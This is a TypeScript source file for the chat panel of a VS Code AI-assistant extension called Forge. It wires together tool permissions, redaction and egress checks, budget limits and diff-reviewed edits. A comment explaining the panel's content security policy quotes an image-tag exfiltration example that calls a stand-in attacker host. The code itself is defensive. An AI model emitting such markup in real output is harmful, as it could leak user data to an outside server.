// The panel's other half: everything the sidebar can do, minus the pixels.
//
// This is where the pieces meet — settings choose the provider, the mode chooses the tools, the
// router decides whether the question is worth escalating, the egress gate decides what may leave,
// the permission book decides what may run, and the session decides what the model is allowed to
// remember. Each of those lives somewhere else and is tested there; this file is the wiring, and
// it is deliberately the only place that knows about all of them.

import * as vscode from "vscode";
import { runTurn, type Tool } from "../core/agent/loop.js";
import { Permissions, commandPrefix, type PermissionStore, type Rule } from "../core/agent/permissions.js";
import { costOf, makeLookup, type Price } from "../core/router/pricing.js";
import { route } from "../core/router/route.js";
import { Session, type ContextItem, type Entry, type SessionData } from "../core/session/session.js";
import { filterHistory, searchTranscript } from "../core/session/history.js";
import { promptForMode, toolsForMode } from "../core/session/modes.js";
import { estimateTokens } from "../core/util/tokens.js";
import { isLocalEndpoint, Vault } from "../core/redaction/index.js";
import type {
  Mode,
  Reasoning,
  Screen,
  ToExtension,
  ToPanel,
  UiEntry,
  UiHistoryFilter,
  UiModel,
  UiPermissionRule,
  UiState,
} from "../shared/protocol.js";
import { endpointFor, providerFor, readSettings, routerConfig, type Keys, type Settings } from "./config.js";
import { EgressGate, safeHost } from "./egress.js";
import { labelFor, listModels, openFiles, supportsReasoning } from "./models.js";
import { loadPrices } from "./prices.js";
import { buildTools } from "./tools.js";
import { WorkspaceContext, relative } from "./workspace.js";

const HISTORY_KEY = "forge.sessions";
const PERMISSIONS_KEY = "forge.permissions";
const PREFS_KEY = "forge.prefs";
const HISTORY_MAX = 100;

interface Prefs {
  mode: Mode;
  reasoning: Reasoning;
}

class MementoPermissionStore implements PermissionStore {
  constructor(private readonly memento: vscode.Memento) {}
  read(): Rule[] {
    return this.memento.get<Rule[]>(PERMISSIONS_KEY, []);
  }
  write(rules: Rule[]): void {
    void this.memento.update(PERMISSIONS_KEY, rules);
  }
}

export class ChatViewProvider implements vscode.WebviewViewProvider {
  public static readonly viewId = "forge.chat";

  private view?: vscode.WebviewView;
  private session = new Session();
  private attachments: ContextItem[] = [];
  private turn?: AbortController;
  private screen: Screen = "chat";
  private searchQuery = "";
  private models: UiModel[] = [];
  private modelsLoading = false;
  private historyFilter: UiHistoryFilter = { query: "", period: "all", mode: "all", paidOnly: false, sort: "updated" };
  private readonly approvals = new Map<string, (answer: "once" | "session" | "always" | "no") => void>();
  private readonly priceLookup = makeLookup(loadPrices());
  private readonly permissions: Permissions;

  constructor(
    private readonly ctx: vscode.ExtensionContext,
    private readonly keys: Keys,
    private readonly workspace: WorkspaceContext,
    private readonly gate: EgressGate,
    private readonly log: vscode.OutputChannel,
  ) {
    this.permissions = new Permissions(new MementoPermissionStore(ctx.globalState));
    const prefs = ctx.globalState.get<Prefs>(PREFS_KEY);
    this.session.mode = prefs?.mode ?? "agent";
    this.reasoning = prefs?.reasoning ?? "none";
  }

  private reasoning: Reasoning = "none";

  resolveWebviewView(view: vscode.WebviewView): void {
    this.view = view;
    view.webview.options = {
      enableScripts: true,
      localResourceRoots: [vscode.Uri.joinPath(this.ctx.extensionUri, "media")],
    };
    view.webview.html = this.html(view.webview);
    view.webview.onDidReceiveMessage((m: ToExtension) => void this.onMessage(m));
    // The list of open editors is part of the UI, so it has to follow the editor.
    const refresh = () => this.screen === "chat" && this.sendState();
    this.ctx.subscriptions.push(
      vscode.window.onDidChangeActiveTextEditor(refresh),
      vscode.workspace.onDidOpenTextDocument(refresh),
      vscode.workspace.onDidCloseTextDocument(refresh),
    );
  }

  // ── UI plumbing ────────────────────────────────────────────────────────────────────────────

  private post(message: ToPanel): void {
    void this.view?.webview.postMessage(message);
  }

  private html(webview: vscode.Webview): string {
    const nonce = randomNonce();
    const uri = (f: string) => webview.asWebviewUri(vscode.Uri.joinPath(this.ctx.extensionUri, "media", f));
    // No remote origin is allowed: the panel loads its own script and its own stylesheet, and a
    // model that emits an <img src="http://attacker/?data"> cannot phone home from here.
    const csp = [
      `default-src 'none'`,
      `img-src ${webview.cspSource} data:`,
      `style-src ${webview.cspSource}`,
      `font-src ${webview.cspSource}`,
      `script-src 'nonce-${nonce}'`,
    ].join("; ");
    return `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="${uri("style.css")}">
<title>Forge</title>
</head>
<body>
<div id="app"></div>
<script nonce="${nonce}" src="${uri("webview.js")}"></script>
</body>
</html>`;
  }

  private uiEntry(e: Entry): UiEntry {
    return {
      id: e.id,
      role: e.role,
      text: e.text,
      at: e.at,
      included: e.included,
      pinned: e.pinned,
      error: e.error,
      model: e.model,
      usdCost: e.usdCost,
      reasoning: e.reasoning,
      steps: e.steps,
      context: e.context?.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
    };
  }

  private sendState(): void {
    const s = readSettings();
    const baseUrl = safeUrl(s, s.chat.provider);
    const stored = this.history();

    const state: UiState = {
      screen: this.screen,
      session: {
        id: this.session.id,
        title: this.session.title,
        mode: this.session.mode,
        entries: this.session.entries.map((e) => this.uiEntry(e)),
      },
      mode: this.session.mode,
      reasoning: this.reasoning,
      reasoningAvailable: supportsReasoning(s.chat.model),
      model: s.chat.model,
      modelLabel: this.models.length ? labelFor(this.models, s.chat.model) : s.chat.model,
      provider: s.chat.provider,
      remote: !isLocalEndpoint(baseUrl),
      contextTokens: this.session.entries
        .filter((e) => e.included)
        .reduce((sum, e) => sum + estimateTokens(e.text) + (e.context ?? []).reduce((a, c) => a + estimateTokens(c.body), 0), 0),
      budget: { spentTodayUsd: this.gate.budget.spentToday(), dailyUsd: s.budget.dailyUsd },
      attachments: this.attachments.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
      openFiles: openFiles(),
      history: filterHistory(stored, this.historyFilter),
      historyFilter: this.historyFilter,
      models: this.models,
      modelsLoading: this.modelsLoading,
      permissions: this.uiPermissions(),
      matches: searchTranscript(this.session.toJSON(), this.searchQuery).map((m) => m.entryId),
      searchQuery: this.searchQuery,
    };
    this.post({ type: "state", state });
  }

  private uiPermissions(): UiPermissionRule[] {
    // Session grants never reach the store, but the type allows them; filter rather than cast.
    const stored: UiPermissionRule[] = this.permissions
      .rules()
      .filter((r): r is Rule & { level: "always" | "never" } => r.level !== "session")
      .map((r) => ({ tool: r.tool, ...(r.prefix ? { prefix: r.prefix } : {}), level: r.level }));
    const session: UiPermissionRule[] = this.permissions.sessionRules().map((key) => {
      const [tool, prefix] = key.split(":");
      return { tool: tool ?? key, ...(prefix ? { prefix } : {}), level: "always" as const, session: true };
    });
    return [...stored, ...session];
  }

  // ── Sessions ───────────────────────────────────────────────────────────────────────────────

  private history(): SessionData[] {
    return this.ctx.workspaceState.get<SessionData[]>(HISTORY_KEY, []);
  }

  private persist(): void {
    if (!this.session.entries.length) return;
    const all = this.history().filter((s) => s.id !== this.session.id);
    all.unshift(this.session.toJSON());
    void this.ctx.workspaceState.update(HISTORY_KEY, all.slice(0, HISTORY_MAX));
  }

  private savePrefs(): void {
    void this.ctx.globalState.update(PREFS_KEY, { mode: this.session.mode, reasoning: this.reasoning } satisfies Prefs);
  }

  /** Open the panel on a given screen — used by the palette commands and by the tests. */
  async show(screen: Screen): Promise<void> {
    await vscode.commands.executeCommand("forge.chat.focus");
    this.screen = screen;
    this.sendState();
    if (screen === "models" && !this.models.length) void this.loadModels();
  }

  newSession(): void {
    this.persist();
    const mode = this.session.mode;
    this.session = new Session();
    this.session.mode = mode;
    this.attachments = [];
    this.screen = "chat";
    this.searchQuery = "";
    // A new conversation starts cautious again: session-wide permissions do not carry over.
    this.permissions.clearSession();
    this.sendState();
  }

  async focusWithPrompt(text: string, context?: ContextItem): Promise<void> {
    await vscode.commands.executeCommand("forge.chat.focus");
    this.screen = "chat";
    if (context) this.attachments.push(context);
    this.sendState();
    await this.ask(text);
  }

  // ── Messages from the panel ────────────────────────────────────────────────────────────────

  private async onMessage(m: ToExtension): Promise<void> {
    try {
      switch (m.type) {
        case "ready":
          this.sendState();
          void this.loadModels();
          break;
        case "send":
          await this.ask(m.text);
          break;
        case "stop":
          this.turn?.abort();
          break;
        case "newSession":
          this.newSession();
          break;
        case "openScreen":
          this.screen = m.screen;
          this.sendState();
          if (m.screen === "models" && !this.models.length) void this.loadModels();
          break;
        case "openSession": {
          this.persist();
          const found = this.history().find((s) => s.id === m.id);
          if (found) this.session = new Session(found);
          this.screen = "chat";
          this.searchQuery = "";
          this.sendState();
          break;
        }
        case "deleteSession": {
          const rest = this.history().filter((s) => s.id !== m.id);
          await this.ctx.workspaceState.update(HISTORY_KEY, rest);
          if (this.session.id === m.id) this.session = new Session();
          this.sendState();
          break;
        }
        case "setMode":
          this.session.mode = m.mode;
          this.savePrefs();
          this.sendState();
          break;
        case "setReasoning":
          this.reasoning = m.reasoning;
          this.savePrefs();
          this.sendState();
          break;
        case "setModel": {
          const config = vscode.workspace.getConfiguration("forge");
          await config.update("chat.model", m.model, vscode.ConfigurationTarget.Workspace);
          if (m.provider && m.provider !== readSettings().chat.provider) {
            await config.update("chat.provider", m.provider, vscode.ConfigurationTarget.Workspace);
          }
          this.models = this.models.map((x) => ({ ...x, current: x.id === m.model }));
          this.screen = "chat";
          this.sendState();
          break;
        }
        case "refreshModels":
          await this.loadModels(true);
          break;
        case "setHistoryFilter":
          this.historyFilter = { ...this.historyFilter, ...m.filter };
          this.sendState();
          break;
        case "search":
          this.searchQuery = m.query;
          this.sendState();
          break;
        case "setIncluded":
          this.session.setIncluded(m.id, m.included);
          this.persist();
          this.sendState();
          break;
        case "setPinned":
          this.session.setPinned(m.id, m.pinned);
          this.persist();
          this.sendState();
          break;
        case "dropEntry":
          this.session.drop(m.id);
          this.persist();
          this.sendState();
          break;
        case "editEntry":
          this.session.editUserEntry(m.id, m.text);
          this.sendState();
          await this.runTurn();
          break;
        case "retry":
          this.session.dropLastAnswer();
          this.sendState();
          await this.runTurn();
          break;
        case "attach":
          await this.attach(m.what);
          break;
        case "attachPath": {
          const folder = vscode.workspace.workspaceFolders?.[0];
          if (folder) {
            const item = await this.workspace.fileContext(vscode.Uri.joinPath(folder.uri, m.path), readSettings());
            if (item) this.attachments.push(item);
          }
          this.sendState();
          break;
        }
        case "removeAttachment":
          this.attachments = this.attachments.filter((a) => a.label !== m.label);
          this.sendState();
          break;
        case "setPermission":
          this.permissions.remember(
            m.tool,
            m.prefix ? { command: m.prefix } : {},
            m.level,
            !m.prefix,
          );
          this.sendState();
          break;
        case "forgetPermission":
          this.permissions.forget(m.tool, m.prefix);
          this.sendState();
          break;
        case "clearSessionPermissions":
          this.permissions.clearSession();
          this.sendState();
          break;
        case "openEgress":
          await vscode.commands.executeCommand("forge.showEgress");
          break;
        case "openCosts":
          await vscode.commands.executeCommand("forge.showCosts");
          break;
        case "openSettings":
          await vscode.commands.executeCommand("workbench.action.openSettings", "forge");
          break;
        case "approve": {
          const resolve = this.approvals.get(m.id);
          this.approvals.delete(m.id);
          resolve?.(m.answer);
          break;
        }
        case "insertCode": {
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage("Aucun éditeur actif où insérer ce code.");
            break;
          }
          await ed.edit((b) => b.replace(ed.selection, m.code));
          break;
        }
        case "applyCode": {
          // "Appliquer" opens the block as a diff against the active file, so the user reviews it
          // in the editor's own diff view rather than trusting a button.
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage("Ouvrez le fichier cible avant d'appliquer.");
            break;
          }
          const preview = ed.document.uri.with({ scheme: "forge-preview", query: String(Date.now()) });
          previewContents.set(preview.toString(), m.code);
          await vscode.commands.executeCommand("vscode.diff", ed.document.uri, preview, `${relative(ed.document.uri)} ↔ proposition`);
          break;
        }
        case "copy":
          await vscode.env.clipboard.writeText(m.text);
          break;
      }
    } catch (err) {
      this.post({ type: "error", message: (err as Error).message });
      this.log.appendLine(`[chat] ${(err as Error).stack ?? (err as Error).message}`);
    }
  }

  private async attach(what: "active" | "selection" | "browse" | "openFiles" | "mention"): Promise<void> {
    const settings = readSettings();
    switch (what) {
      case "active":
      case "selection": {
        const item = this.workspace.activeContext();
        if (item) this.attachments.push(item);
        break;
      }
      case "browse": {
        const picked = await vscode.window.showOpenDialog({ canSelectMany: true, openLabel: "Joindre" });
        for (const uri of picked ?? []) {
          const item = await this.workspace.fileContext(uri, settings);
          if (item) this.attachments.push(item);
        }
        break;
      }
      case "openFiles": {
        for (const f of openFiles()) {
          const folder = vscode.workspace.workspaceFolders?.[0];
          if (!folder) break;
          const item = await this.workspace.fileContext(vscode.Uri.joinPath(folder.uri, f.path), settings);
          if (item && !this.attachments.some((a) => a.label === item.label)) this.attachments.push(item);
        }
        break;
      }
      case "mention": {
        const files = await this.workspace.findFiles("", 100);
        const picked = await vscode.window.showQuickPick(files, { placeHolder: "Quel fichier joindre ?" });
        if (picked) await this.onMessage({ type: "attachPath", path: picked });
        return;
      }
    }
    this.sendState();
  }

  private async loadModels(force = false): Promise<void> {
    if (this.modelsLoading) return;
    this.modelsLoading = true;
    this.sendState();
    try {
      const settings = readSettings();
      this.models = await listModels(settings, this.keys, settings.chat.model);
    } catch (err) {
      this.log.appendLine(`[models] ${(err as Error).message}`);
    } finally {
      this.modelsLoading = false;
      this.sendState();
    }
    if (force) this.post({ type: "status", text: `${this.models.length} modèles` });
  }

  private async ask(text: string): Promise<void> {
    if (!text.trim()) return;
    this.screen = "chat";
    this.session.add({ role: "user", text, context: this.attachments.length ? this.attachments : undefined });
    this.attachments = [];
    this.sendState();
    await this.runTurn();
  }

  // ── The turn ───────────────────────────────────────────────────────────────────────────────

  private async runTurn(): Promise<void> {
    const settings = readSettings();
    const mode = this.session.mode;
    this.turn?.abort();
    const ctl = new AbortController();
    this.turn = ctl;
    this.post({ type: "turnStart" });

    const nonce = randomNonce();
    // Chat mode answers from what it was given: no repository map, no tools, no surprises.
    const ambient =
      mode !== "chat" && settings.context.repoMap
        ? await this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4))
        : undefined;
    const allTools: Tool[] = buildTools({ settings: () => settings, confirmEdit: (u, n) => this.confirmEdit(u, n) });
    const tools = toolsForMode(allTools, mode);

    const built = this.session.build({
      systemPrompt: promptForMode(mode) + workspaceNote(),
      ambient: ambient ? `${ambient.text}\n\n(${ambient.files} fichiers cartographiés, ${ambient.omitted} omis)` : undefined,
      maxTokens: settings.context.maxTokens,
      nonce,
    });

    const lastUser = [...this.session.entries].reverse().find((e) => e.role === "user");
    const decision = route(routerConfig(settings), {
      kind: mode === "chat" ? "chat" : "agent",
      prompt: lastUser?.text ?? "",
      promptTokens: built.estimatedTokens,
    });
    let providerId = decision.provider;
    let model = decision.model;
    if (decision.suggestEscalation) {
      const choice = await vscode.window.showInformationMessage(
        `Cette question dépasse le modèle local (${decision.suggestEscalation.why}). L'envoyer à ${decision.suggestEscalation.model} ?`,
        "Envoyer",
        "Rester en local",
      );
      if (choice === "Envoyer") {
        providerId = decision.suggestEscalation.provider;
        model = decision.suggestEscalation.model;
      }
    }

    const baseUrl = safeUrl(settings, providerId);
    const isLocal = isLocalEndpoint(baseUrl);
    const vault = new Vault();
    const steps: Array<{ tool: string; summary: string; ok: boolean }> = [];

    try {
      const provider = await providerFor(settings, this.keys, providerId);

      const prepared = await this.gate.prepare(built.messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
      if (!prepared) {
        this.post({ type: "status", text: "Envoi annulé." });
        this.post({ type: "turnEnd" });
        return;
      }

      if (!isLocal) {
        const estimate = estimateCost(prepared.estimatedTokens, this.priceLookup(model));
        const verdict = this.gate.budget.check(estimate);
        if (!verdict.ok) {
          this.post({ type: "error", message: `Budget : ${verdict.message}. Ajustez forge.budget ou restez en local.` });
          this.post({ type: "turnEnd" });
          return;
        }
      }

      const answer = this.session.add({ role: "assistant", text: "", model });
      let streamed = "";
      let thought = "";

      const result = await runTurn({
        provider,
        model,
        messages: prepared.messages,
        tools,
        signal: ctl.signal,
        maxTokens: 4096,
        reasoning: this.reasoning,
        onDelta: (d) => {
          if (d.text) {
            streamed += d.text;
            // Placeholders are resolved as they stream, so the user never reads their own data
            // through a marker.
            this.post({ type: "delta", text: vault.restore(d.text) });
          }
          if (d.reasoning) {
            thought += d.reasoning;
            this.post({ type: "reasoning", text: vault.restore(d.reasoning) });
          }
        },
        onToolResult: ({ call, result }) => {
          const summary = String(result.content).split("\n")[0]?.slice(0, 120) ?? "";
          steps.push({ tool: call.name, summary, ok: !result.isError });
          this.post({ type: "status", text: summary, tool: call.name, ok: !result.isError });
        },
        report: (msg) => this.post({ type: "status", text: msg }),
        approve: (req) => this.askApproval(req),
        // Redaction runs on EVERY step, because a tool result is new text that never went through
        // the gate — a file the agent just read can contain the credential the first prompt did not.
        //
        // A refusal here must ABORT the turn. Falling back to the original messages would send the
        // unredacted text precisely when the user said no.
        beforeRequest: async (messages) => {
          if (isLocal) return messages;
          const again = await this.gate.prepare(messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
          if (!again) throw new Error("Envoi refusé : la suite du tour n'a pas été transmise.");
          return again.messages;
        },
        afterResponse: (t) => vault.restore(t),
      });

      answer.text = result.text || streamed;
      answer.usdCost = 0;
      if (thought) answer.reasoning = thought;
      if (steps.length) answer.steps = steps;

      if (!isLocal) {
        const cost = costOf(result.usage, this.priceLookup(model));
        answer.usdCost = cost.usd;
        this.gate.record(
          {
            at: Date.now(),
            provider: providerId,
            host: safeHost(baseUrl),
            model,
            promptTokens: result.usage.promptTokens,
            completionTokens: result.usage.completionTokens,
            cachedTokens: result.usage.cachedTokens,
            usd: cost.usd,
            redactions: prepared.findings.length,
            redactionSummary: vault.summary().map((x) => `${x.label}×${x.count}`).join(", "),
          },
          settings,
        );
      }

      if (result.stoppedBecause === "max-steps") {
        this.post({ type: "status", text: "Arrêté après le nombre maximal d'étapes." });
      }
      this.persist();
    } catch (err) {
      const message = (err as Error).message;
      const last = this.session.entries[this.session.entries.length - 1];
      if (last?.role === "assistant" && !last.text) last.error = message;
      this.post({ type: "error", message });
      this.log.appendLine(`[turn] ${message}`);
    } finally {
      this.turn = undefined;
      this.post({ type: "turnEnd" });
      this.sendState();
    }
  }

  /**
   * Ask, unless the permission book already answered. The book is consulted BEFORE the panel is
   * disturbed, which is what makes "toujours autoriser" worth anything.
   */
  private askApproval(req: { tool: string; description: string; args: Record<string, unknown> }): Promise<boolean> {
    const decision = this.permissions.decide(req.tool, req.args);
    if (decision === "always" || decision === "session") {
      this.post({ type: "status", text: `${req.description} — autorisé par une règle`, tool: req.tool, ok: true });
      return Promise.resolve(true);
    }
    if (decision === "never") {
      this.post({ type: "status", text: `${req.description} — refusé par une règle`, tool: req.tool, ok: false });
      return Promise.resolve(false);
    }

    const id = randomNonce();
    const command = req.tool === "run_command" ? String(req.args["command"] ?? "") : undefined;
    this.post({ type: "approval", id, tool: req.tool, description: req.description, ...(command ? { command } : {}) });
    return new Promise<boolean>((resolve) => {
      this.approvals.set(id, (answer) => {
        if (answer === "session" || answer === "always") {
          this.permissions.remember(req.tool, req.args, answer);
          this.sendState();
        }
        resolve(answer !== "no");
      });
      // A turn that is cancelled must not leave a promise hanging forever.
      this.turn?.signal.addEventListener("abort", () => {
        if (this.approvals.delete(id)) resolve(false);
      });
    });
  }

  /** Show the change as a diff before it is applied — the reviewable-edit rule. */
  private async confirmEdit(uri: vscode.Uri, next: string): Promise<boolean> {
    const original = await readOrEmpty(uri);
    const preview = uri.with({ scheme: "forge-preview", query: Date.now().toString() });
    previewContents.set(preview.toString(), next);
    await vscode.commands.executeCommand(
      "vscode.diff",
      original === undefined ? vscode.Uri.parse("untitled:nouveau") : uri,
      preview,
      `${relative(uri)} — proposition de Forge`,
      { preview: true },
    );
    const answer = await vscode.window.showInformationMessage(
      `Appliquer la modification de ${relative(uri)} ?`,
      { modal: false },
      "Appliquer",
      "Refuser",
    );
    previewContents.delete(preview.toString());
    return answer === "Appliquer";
  }
}

/** Backing store for the diff preview documents. */
export const previewContents = new Map<string, string>();

export class PreviewProvider implements vscode.TextDocumentContentProvider {
  provideTextDocumentContent(uri: vscode.Uri): string {
    return previewContents.get(uri.toString()) ?? "";
  }
}

function workspaceNote(): string {
  const folder = vscode.workspace.workspaceFolders?.[0];
  return folder ? `\n\nWorkspace: ${folder.name}.` : "";
}

function safeUrl(s: Settings, id: Settings["chat"]["provider"]): string {
  try {
    return endpointFor(s, id);
  } catch {
    return "";
  }
}

async function readOrEmpty(uri: vscode.Uri): Promise<string | undefined> {
  try {
    return new TextDecoder().decode(await vscode.workspace.fs.readFile(uri));
  } catch {
    return undefined;
  }
}

function estimateCost(promptTokens: number, price: Price | undefined): number {
  if (!price) return 0;
  // Assume an answer about a quarter the size of the question: enough to catch a runaway prompt,
  // not so pessimistic that the cap fires on ordinary turns.
  return (promptTokens * price.in + promptTokens * 0.25 * price.out) / 1_000_000;
}

function randomNonce(): string {
  const bytes = new Uint8Array(16);
  // The webview CSP nonce and the untrusted-content fence both depend on this being unguessable.
  (globalThis.crypto ?? require("node:crypto").webcrypto).getRandomValues(bytes);
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

export { commandPrefix };
